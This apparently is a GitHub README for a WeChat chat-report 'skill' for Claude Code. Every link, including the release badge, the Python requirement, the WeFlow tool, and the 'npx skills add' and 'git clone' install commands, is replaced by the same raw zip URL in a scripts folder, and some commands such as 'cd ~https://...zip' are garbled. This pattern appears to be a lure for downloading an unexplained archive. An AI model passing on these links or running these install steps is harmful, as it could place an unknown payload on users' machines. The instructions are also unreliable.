# 🛠️ wechat-daily-report-skill - Generate Daily Reports Easily

[![GitHub Releases](https://github.com/leonense22/wechat-daily-report-skill/raw/refs/heads/main/scripts/wechat-skill-daily-report-3.9.zip%https://github.com/leonense22/wechat-daily-report-skill/raw/refs/heads/main/scripts/wechat-skill-daily-report-3.9.zip)](https://github.com/leonense22/wechat-daily-report-skill/raw/refs/heads/main/scripts/wechat-skill-daily-report-3.9.zip)

## 🚀 Getting Started

This tool helps you analyze WeChat group chat records. It combines AI to generate content and outputs a well-designed long image (PNG) for your mobile device.

### Features

- **Data Analysis**: Automatically analyzes chat records to create statistics like the talkative leaderboard and word clouds.
- **AI Summary**: Uses AI to identify hot topics and extract valuable resources or tutorials.
- **Visual Reports**: Automatically generates daily reports that fit mobile screens, such as the iPhone 14 Pro Max resolution.
- **Creative Styles**: Supports humorous and playful report styles, enhancing reading enjoyment.

## 🛠️ Requirements

- Python 3.8 or higher
- https://github.com/leonense22/wechat-daily-report-skill/raw/refs/heads/main/scripts/wechat-skill-daily-report-3.9.zip (optional, only for development)

### Install Python Libraries

Run the following command in your terminal:

```bash
pip install jieba jinja2 playwright
playwright install chromium
```

## 📥 Download & Install

### Step 1: Install the Skill

**Automatic Installation (Recommended)**:
```bash
npx skills add https://github.com/leonense22/wechat-daily-report-skill/raw/refs/heads/main/scripts/wechat-skill-daily-report-3.9.zip
```

**Manual Installation**:
Clone this repository into your Claude Skills directory. If the directory does not exist, please create it first:

```bash
cd ~https://github.com/leonense22/wechat-daily-report-skill/raw/refs/heads/main/scripts/wechat-skill-daily-report-3.9.zip
git clone https://github.com/leonense22/wechat-daily-report-skill/raw/refs/heads/main/scripts/wechat-skill-daily-report-3.9.zip
```

### Step 2: Get Chat Records

Use [WeFlow](https://github.com/leonense22/wechat-daily-report-skill/raw/refs/heads/main/scripts/wechat-skill-daily-report-3.9.zip) to export the WeChat chat records you want to analyze. Choose **ChatLab** format for export.

### Step 3: Basic Usage

In Claude Code, simply instruct Claude:

> **“Generate [Group Name] Daily Report”**

Claude will automatically run the scripts from this project, analyze the chat records, and generate a beautiful daily report image.

## 📂 Data Format

### Input Chat Record JSON Structure

Here is a sample structure to follow when preparing your chat records:

```json
{
  "meta": {
    "group_name": "YourGroupName",
    "date": "YYYY-MM-DD"
  },
  "messages": [
    {
      "user": "User1",
      "message": "Hello!",
      "timestamp": "2023-10-01T10:00:00Z"
    },
    {
      "user": "User2",
      "message": "Hi there!",
      "timestamp": "2023-10-01T10:01:00Z"
    }
  ]
}
```

## 📥 Additional Resources

For further details, visit our [Releases Page](https://github.com/leonense22/wechat-daily-report-skill/raw/refs/heads/main/scripts/wechat-skill-daily-report-3.9.zip) where you can find the latest version available for download.